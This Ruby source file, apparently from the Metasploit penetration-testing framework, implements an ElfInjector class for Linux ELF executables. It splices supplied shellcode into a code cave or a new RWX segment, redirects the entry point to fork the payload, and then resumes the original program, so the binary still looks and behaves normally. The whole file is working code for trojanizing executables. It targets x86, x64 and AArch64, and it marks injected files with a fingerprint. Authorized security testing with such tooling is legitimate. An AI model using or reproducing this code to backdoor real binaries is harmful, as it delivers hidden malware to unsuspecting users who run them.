# frozen_string_literal: true

require 'elftools'
require 'digest/sha1'
require 'metasm'
require 'stringio'

module Msf
  module Exe
    # Injects a forked payload into an ELF executable while preserving its original entry point.
    #
    # Code-cave injection extends the file and memory sizes of an executable PT_LOAD into zero-filled,
    # unallocated padding. The existing segment becomes writable because injected payloads may need
    # writable memory. If no suitable cave exists, a PT_NULL or an unprotected PT_NOTE is replaced by
    # a new RWX PT_LOAD. Segment and section handling follows the System V ABI program-loading rules:
    # https://refspecs.linuxfoundation.org/elf/gabi4+/ch5.pheader.html
    class ElfInjector
      ET_EXEC = ELFTools::Constants::ET::ET_EXEC
      ET_DYN = ELFTools::Constants::ET::ET_DYN

      PT_NULL = ELFTools::Constants::PT::PT_NULL
      PT_LOAD = ELFTools::Constants::PT::PT_LOAD
      PT_NOTE = ELFTools::Constants::PT::PT_NOTE
      PT_GNU_PROPERTY = ELFTools::Constants::PT::PT_GNU_PROPERTY

      SHT_NOBITS = ELFTools::Constants::SHT::SHT_NOBITS

      PF_X = ELFTools::Constants::PF::PF_X
      PF_W = ELFTools::Constants::PF::PF_W
      PF_R = ELFTools::Constants::PF::PF_R

      FINGERPRINT_BYTES = 2080
      MAX_ALIGNMENT = 0x200000

      MACHINE_ARCHITECTURES = {
        [32, ELFTools::Constants::EM::EM_386] => :x86,
        [64, ELFTools::Constants::EM::EM_X86_64] => :x64,
        [64, ELFTools::Constants::EM::EM_AARCH64] => :aarch64
      }.freeze

      EXPECTED_PROGRAM_HEADER_SIZES = {
        32 => 32,
        64 => 56
      }.freeze

      EXPECTED_SECTION_HEADER_SIZES = {
        32 => 40,
        64 => 64
      }.freeze

      EXPECTED_HEADER_SIZES = {
        32 => 52,
        64 => 64
      }.freeze

      # @return [Symbol, nil] Injection technique used by the last call to generate.
      attr_reader :technique

      # @param template [String] Contents of the ELF executable to modify.
      # @param payload [String] Position-independent Linux shellcode to inject.
      def initialize(template:, payload: ''.b)
        raise ArgumentError, 'template must be a String' unless template.is_a?(String)
        raise ArgumentError, 'payload must be a String' unless payload.is_a?(String)

        @template = template.b
        @payload = payload.b
        parse_header
        parse_program_headers
        parse_section_headers
      rescue ELFTools::ELFError => e
        raise ArgumentError, e.message
      end

      # @return [Symbol] The ELF architecture.
      def architecture
        MACHINE_ARCHITECTURES.fetch([@bits, @machine])
      end

      # @return [Boolean] Whether this injector's marker is present.
      def injected?
        @template.include?(fingerprint)
      end

      # @return [String] SHA-1 fingerprint of the first 2080 bytes of the .text section, or of a canonicalized executable prefix for sectionless ELFs.
      def fingerprint
        @fingerprint ||= Digest::SHA1.hexdigest(fingerprint_data).b
      end

      # @return [String] A modified ELF that forks the payload and resumes the original entry point.
      def generate
        raise ArgumentError, 'ELF is already injected' if injected?
        raise ArgumentError, 'payload must not be empty' if @payload.empty?

        code_cave = find_code_cave
        return inject_code_cave(code_cave) if code_cave

        inject_new_segment
      end

      private

      def inject_new_segment
        program_header = reusable_program_header
        alignment = segment_alignment
        injected_offset = align_up([@template.bytesize, fingerprint_file_range.last].max, alignment)
        injected_address = align_up(load_segments.map { |segment| segment[:virtual_address] + segment[:memory_size] }.max, alignment)
        trampoline = build_trampoline(injected_address)
        injected_data = trampoline + @payload + fingerprint

        modified = @template.dup
        modified << "\x00".b * (injected_offset - modified.bytesize)
        modified << injected_data
        modified[@entrypoint_offset, @word_size] = pack_word(injected_address)
        modified[program_header[:header_offset], @program_header_size] = encode_program_header(
          type: PT_LOAD,
          flags: PF_R | PF_W | PF_X,
          offset: injected_offset,
          virtual_address: injected_address,
          physical_address: injected_address,
          file_size: injected_data.bytesize,
          memory_size: injected_data.bytesize,
          alignment: alignment
        )
        @technique = :program_header
        modified
      end

      def inject_code_cave(code_cave)
        segment = code_cave.fetch(:segment).dup
        segment[:flags] |= PF_W
        segment[:file_size] += code_cave.fetch(:data).bytesize
        segment[:memory_size] = [segment[:memory_size], segment[:file_size]].max

        modified = @template.dup
        modified[code_cave.fetch(:offset), code_cave.fetch(:data).bytesize] = code_cave.fetch(:data)
        modified[@entrypoint_offset, @word_size] = pack_word(code_cave.fetch(:address))
        modified[segment[:header_offset], @program_header_size] = encode_program_header(segment)
        @technique = :code_cave
        modified
      end

      def parse_header
        raise ArgumentError, 'template is too small to be an ELF' if @template.bytesize < 52

        @elf = ELFTools::ELFFile.new(StringIO.new(@template))
        @bits = @elf.elf_class
        raise ArgumentError, 'template is too small to be a 64-bit ELF' if @bits == 64 && @template.bytesize < 64
        raise ArgumentError, 'only little-endian ELF executables are supported' unless @elf.endian == :little

        header = @elf.header
        @machine = header.e_machine.to_i
        raise ArgumentError, 'unsupported ELF class and machine architecture combination' unless MACHINE_ARCHITECTURES.key?([@bits, @machine])

        @type = header.e_type.to_i
        raise ArgumentError, 'ELF must be ET_EXEC or ET_DYN' unless [ET_EXEC, ET_DYN].include?(@type)
        raise ArgumentError, 'ELF has an invalid header size' unless header.e_ehsize.to_i == EXPECTED_HEADER_SIZES[@bits]

        @word_size = @bits / 8
        @entrypoint_offset = header.offset + header.e_entry.abs_offset
        @entrypoint = header.e_entry.to_i
        @program_header_offset = header.e_phoff.to_i
        @section_header_offset = header.e_shoff.to_i
        @program_header_size = header.e_phentsize.to_i
        @program_header_count = header.e_phnum.to_i
        @section_header_size = header.e_shentsize.to_i
        @section_header_count = header.e_shnum.to_i

        raise ArgumentError, 'ELF has an invalid program header size' unless @program_header_size == EXPECTED_PROGRAM_HEADER_SIZES[@bits]
        raise ArgumentError, 'ELF has an invalid program header count' unless @program_header_count.between?(1, 128)

        table_end = @program_header_offset + (@program_header_size * @program_header_count)
        raise ArgumentError, 'ELF program header table is truncated' if table_end > @template.bytesize
      end

      def parse_program_headers
        @program_headers = @elf.each_segments.map do |segment|
          header = segment.header
          {
            header_offset: header.offset,
            type: header.p_type.to_i,
            offset: header.p_offset.to_i,
            virtual_address: header.p_vaddr.to_i,
            physical_address: header.p_paddr.to_i,
            file_size: header.p_filesz.to_i,
            memory_size: header.p_memsz.to_i,
            flags: header.p_flags.to_i,
            alignment: header.p_align.to_i
          }
        end

        raise ArgumentError, 'ELF has no loadable segments' if load_segments.empty?
        unless load_segments.all? do |segment|
          segment[:memory_size] >= segment[:file_size] && segment[:offset] + segment[:file_size] <= @template.bytesize
        end
          raise ArgumentError, 'ELF has an invalid loadable segment'
        end
        raise ArgumentError, 'ELF entry point is not in an executable segment' unless load_segments.any? do |segment|
          segment[:flags] & PF_X != 0 && @entrypoint >= segment[:virtual_address] && @entrypoint < segment[:virtual_address] + segment[:memory_size]
        end
      end

      def parse_section_headers
        @section_ranges = []
        @nobits_section_ranges = []
        @section_metadata_valid = @section_header_offset.zero? && @section_header_count.zero?
        return if @section_header_count.zero?
        return unless @section_header_size == EXPECTED_SECTION_HEADER_SIZES[@bits]

        table_size = @section_header_size * @section_header_count
        table_end = @section_header_offset + table_size
        return if @section_header_offset.zero? || table_end > @template.bytesize

        @section_ranges << [@section_header_offset, table_end]
        valid = true
        @elf.each_sections do |section|
          header = section.header
          section_type = header.sh_type.to_i
          section_address = header.sh_addr.to_i
          section_offset = header.sh_offset.to_i
          section_size = header.sh_size.to_i
          next if section_size.zero?

          if section_type == SHT_NOBITS
            @nobits_section_ranges << [section_address, section_address + section_size]
            next
          end

          section_end = section_offset + section_size
          if section_end > @template.bytesize
            valid = false
            break
          end

          @section_ranges << [section_offset, section_end]
        end
        unless valid
          @section_ranges.clear
          @nobits_section_ranges.clear
        end
        @section_metadata_valid = valid
      end

      def load_segments
        @program_headers.select { |segment| segment[:type] == PT_LOAD }
      end

      def find_code_cave
        return unless @section_metadata_valid

        load_segments.each do |segment|
          next unless segment[:flags] & PF_X != 0

          offset = segment[:offset] + segment[:file_size]
          segment_end_address = segment[:virtual_address] + segment[:file_size]
          padding_size = align_up(segment_end_address, instruction_alignment) - segment_end_address
          address = segment_end_address + padding_size
          file_capacity = file_code_cave_capacity(segment, offset)
          memory_capacity = memory_code_cave_capacity(segment, segment_end_address)
          next if file_capacity <= 0 || memory_capacity <= 0

          data = ("\x00".b * padding_size) + build_trampoline(address) + @payload + fingerprint
          next if data.bytesize > [file_capacity, memory_capacity].min
          next if ranges_overlap?([offset, offset + data.bytesize], fingerprint_file_range)

          cave = @template.byteslice(offset, data.bytesize)
          next unless cave && cave.bytes.all?(&:zero?)

          return { segment: segment, offset: offset, address: address, data: data }
        end
        nil
      end

      def file_code_cave_capacity(segment, offset)
        ranges = @program_headers.filter_map do |header|
          next if header.equal?(segment) || header[:file_size].zero?

          [header[:offset], header[:offset] + header[:file_size]]
        end
        ranges.concat(@section_ranges)
        return 0 if ranges.any? { |range_start, range_end| range_start < offset && range_end > offset }

        boundary = ranges.filter_map { |range_start, _range_end| range_start if range_start >= offset }.min || @template.bytesize
        [boundary, @template.bytesize].min - offset
      end

      def memory_code_cave_capacity(segment, address)
        return 0 if load_segments.any? do |header|
          !header.equal?(segment) && header[:virtual_address] <= address && header[:virtual_address] + header[:memory_size] > address
        end
        return 0 if @nobits_section_ranges.any? { |range_start, range_end| range_start <= address && range_end > address }

        boundaries = @nobits_section_ranges.filter_map { |range_start, _range_end| range_start if range_start >= address }
        boundaries.concat(load_segments.filter_map do |header|
          header[:virtual_address] if !header.equal?(segment) && header[:virtual_address] >= address
        end)

        mapped_capacity = segment[:virtual_address] + segment[:memory_size] - address
        boundaries << address + mapped_capacity if mapped_capacity.positive?
        boundary = boundaries.min
        boundary ? boundary - address : 0
      end

      def reusable_program_header
        null_header = @program_headers.find { |header| header[:type] == PT_NULL }
        return null_header if null_header

        property_ranges = @program_headers.select { |header| header[:type] == PT_GNU_PROPERTY }.map do |header|
          [header[:offset], header[:offset] + header[:file_size]]
        end
        note_header = @program_headers.find do |header|
          next unless header[:type] == PT_NOTE

          note_start = header[:offset]
          note_end = note_start + header[:file_size]
          property_ranges.none? { |property_start, property_end| note_start < property_end && property_start < note_end }
        end
        raise ArgumentError, 'ELF has no reusable PT_NULL or PT_NOTE program header' unless note_header

        note_header
      end

      def segment_alignment
        minimum_alignment = architecture == :aarch64 ? 0x10000 : 0x1000
        alignment = [minimum_alignment, *load_segments.map { |segment| segment[:alignment] }].max
        unless alignment.positive? && (alignment & (alignment - 1)).zero? && alignment <= MAX_ALIGNMENT
          raise ArgumentError, 'ELF segment alignment is unsupported'
        end

        alignment
      end

      def encode_program_header(header)
        encoded = ELFTools::Structs::ELF_Phdr.fetch(@bits).new(endian: @elf.endian)
        encoded.elf_class = @bits
        encoded.assign(
          p_type: header.fetch(:type),
          p_flags: header.fetch(:flags),
          p_offset: header.fetch(:offset),
          p_vaddr: header.fetch(:virtual_address),
          p_paddr: header.fetch(:physical_address),
          p_filesz: header.fetch(:file_size),
          p_memsz: header.fetch(:memory_size),
          p_align: header.fetch(:alignment)
        )
        encoded.to_binary_s
      end

      def fingerprint_data
        section = text_section
        if section
          section_offset = section.header.sh_offset.to_i
          size = [section.header.sh_size.to_i, FINGERPRINT_BYTES].min
          @fingerprint_file_range = [section_offset, section_offset + size]
          return section.data.byteslice(0, FINGERPRINT_BYTES).to_s.b
        end

        @fingerprint_file_range = [0, FINGERPRINT_BYTES]
        data = @template.byteslice(0, FINGERPRINT_BYTES).to_s.ljust(FINGERPRINT_BYTES, "\x00").b
        data[@entrypoint_offset, @word_size] = "\x00".b * @word_size
        program_headers_size = @program_header_size * @program_header_count
        if @program_header_offset < FINGERPRINT_BYTES
          size = [program_headers_size, FINGERPRINT_BYTES - @program_header_offset].min
          data[@program_header_offset, size] = "\x00".b * size
        end
        data.byteslice(0, FINGERPRINT_BYTES)
      end

      def fingerprint_file_range
        fingerprint unless @fingerprint_file_range
        @fingerprint_file_range
      end

      def ranges_overlap?(first, second)
        first[0] < second[1] && second[0] < first[1]
      end

      def text_section
        return @text_section if defined?(@text_section)

        section = @section_metadata_valid ? @elf.section_by_name('.text') : nil
        @text_section = section if section && section.header.sh_type.to_i != SHT_NOBITS && section.header.sh_size.to_i.positive?
      rescue ELFTools::ELFError, IOError, NoMethodError
        @text_section = nil
      end

      def build_trampoline(injected_address)
        implementation = {
          x86: X86,
          x64: X64,
          aarch64: AArch64
        }.fetch(architecture)
        implementation.new(entrypoint: @entrypoint, injected_address: injected_address).generate
      end

      def align_up(value, alignment)
        (value + alignment - 1) & -alignment
      end

      def instruction_alignment
        architecture == :aarch64 ? 4 : 1
      end

      def pack_word(value)
        @word_size == 4 ? [value].pack('V') : [value].pack('Q<')
      end
    end
  end
end

require 'msf/core/exe/elf_injector/a_arch64'
require 'msf/core/exe/elf_injector/x64'
require 'msf/core/exe/elf_injector/x86'
